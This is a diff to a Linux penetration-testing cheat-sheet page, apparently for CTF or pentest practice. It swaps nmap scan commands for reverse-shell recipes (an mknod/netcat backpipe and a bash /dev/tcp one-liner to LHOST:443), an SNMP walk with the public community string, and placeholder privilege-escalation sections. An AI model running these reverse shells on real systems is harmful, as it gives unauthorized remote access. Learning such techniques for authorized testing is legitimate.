@@ -3,74 +3,65 @@ layout: base
 title: linux
 ---
 
-<p class="lead">How do we pop mad shells on them *nix?</p>
+<p class="lead">Linux-specific snippets and methods</p>
 
 <!-- Enumeration -->
 <h3>Enumeration</h3>
 
-<!-- nmap -->
-<h5>nmap</h5>
-{% assign tabs = "nmap_loud|nmap_quiet" %}
-{% assign tabnames = "Loud|Quiet" %} {% assign content = "
-<p>Run these in parallel.</p>
-SCODE
-<code>nmap -sC -sV -oG services.nmap & </code>
-</div>
-SCODE
-<code>nmap -T5 -p- -oG alltcp.nmap RHOST & </code>
-</div>
-SCODE
-<code>nmap -sU --max-retries 3 -oG udp.nmap RHOST & </code>
-</div><br>
-<p>Follow up by scanning each interesting port found with <span><code>-sC -sV</code></span>.</p>
-<p>If stuck, hit 'em with the:</p>
-SCODE
-<code>nmap -sU -p- --max-retries 3 -oG alludp.nmap RHOST</code>
-</div>
 
-|
 
-<p>Individually investigate interesting ports after output of the first command.</p>
-SCODE
-<code>nmap -sT -Pn -T1 -oG quietscan RHOST</code>
-</div>
-SCODE    
-<code>nmap -sC -sV -Pn -T1 -pPORT,PORT,PORT -oG ports.nmap RHOST</code>
-</div>
-SCODE
-<code>nmap -sU -Pn -T1 --max-retries 2 -oG udp.nmap RHOST</code>
-</div><br>
-<p>Or, just scan common ports.</p>
-SCODE
-<code>nmap -sT -T4 -P0 -T2 -p22,80,443 -oG common.nmap RHOST &</code>
-</div>" %} {% include block.html %}
 
-<!-- Entry -->
 <h3>Entry</h3>
 
-<!-- ssh -->
+<h5>reverse shells</h5>
+{% assign tabs = "rs_mknod|rs_devtcp"%} {% assign tabnames = "mknod method|/dev/tcp method" %} {% assign content =  "
+On your local computer:
+SCODE
+<code>nc -nvlp 443</code><br>
+</div>
+On remote computer:
+SCODE
+<code>mknod /tmp/backpipe p && </code><br>
+</div>
+SCODE
+<code>/bin/sh 0< /tmp/backpipe &#124; nc LHOST 443 1> /tmp/backpipe </code>
+</div>
+|
+On local:
+SCODE
+<code>nc -nvlp 443</code><br>
+</div>
+On remote:
+SCODE
+<code>bash -i >& /dev/tcp/LHOST/443 0>&1</code><br>
+</div>" %} {% include block.html %}
+
 <h5>ssh // 22</h5>
 {% assign tabs = "ssh_bruteforcing|ssh_exploitation"%} {% assign tabnames = "Bruteforcing|Exploitation" %} {% assign content =  "
 bruetforcing
-
 |
-
-There won't be any RCE vulnerabilities for OpenBSD ssh. If it's an older version, add an informational vuln. If it's not OpenSSH, <code>searchsploit</code> it.
-
+There won't be any RCE vulnerabilities for OpenBSD ssh. If it's an older version, add an informational vuln. If it's not OpenSSH, <span><code>searchsploit</code></span> it.
 " %} {% include block.html %}
 
-
+<h5>snmp // 161</h5>
+{% assign tabs = "snmp_getinfo"%} {% assign tabnames = "Walk to Gather Info" %} {% assign content =  "
+Get info from v1 SNMP:
+SCODE
+<code>snmpwalk -c public -v1 RHOST</code>
+</div>
+" %} {% include block.html %}
+ 
 <!-- postgres -->
 <h5>postgres // 5432</h5>
 {% assign tabs = "psql_default_creds|psql_exploitation"%}
 {% assign tabnames = "Default Creds|Exploitation"%}
 {% assign content = 
 "
-
+postgres default creds content here
 
 |
 
-There won't be any RCE vulnerabilities for OpenBSD ssh. If it's an older version, add an informational vuln. If it's not OpenSSH, <code>searchsploit</code> it.
+postgres can be 'exploited' with the code exec feature. it's not a real exploit.
 
 "%} {% include block.html %}
 
@@ -96,13 +87,13 @@ Redis (4.x/5.x) RCE can be achieved through two misconfiguraitons.
 <h3>Privilege Escalation</h3>
 	
 <!-- ssh -->
-{% assign tabs = "bruteforcing|exploitation" %}
-{% assign tabnames = "bruteforcing|exploitation" %} {% assign content = "
-bruteforcing
+{% assign tabs = "priv1|priv2" %}
+{% assign tabnames = "privone|privtwo" %} {% assign content = "
+PRIVESC 1
 
 |
 
-There won't be any RCE vulnerabilities for OpenBSD ssh. If it's an older version, add an informational vuln. If it's not OpenSSH, <code>searchsploit</code> it.
+PRIVESC2.
 
 " %} {% include block.html %}
 
@@ -111,9 +102,10 @@ There won't be any RCE vulnerabilities for OpenBSD ssh. If it's an older version
 
 <!-- Other Avenues -->
 <h5>Finding other Avenues of Privesc</h5>
-{% assign tabs = "other_privesc|" %} {% assign tabnames = "Standard Privesc" %}
+{% assign tabs = "other_privesc" %} {% assign tabnames = "Standard Privesc" %}
 {% assign content =  "
 
+Lorem ipsum. Other avenues.
 
 |
 
@@ -122,19 +114,8 @@ There won't be any RCE vulnerabilities for OpenBSD ssh. If it's an older version
 "%}
 {% include block.html %}
 
-<!--  -->
-{% assign header = "ssh" %}
-{% assign tabs = "other_privesc|" %}
-{% assign content =  "
-
-|
-
-There won't be any RCE vulnerabilities for OpenBSD ssh. If it's an older version, add an informational vuln. If it's not OpenSSH, <code>searchsploit</code> it.
-
-"%} {% include block.html %}
-
-<!-- Informational Vulns -->
-<h5>Finding Informational Vulns</h5>
+<!-- Informational Vulns
+<h5>Finding Informational Vulns</h5>  -->
 
 
 
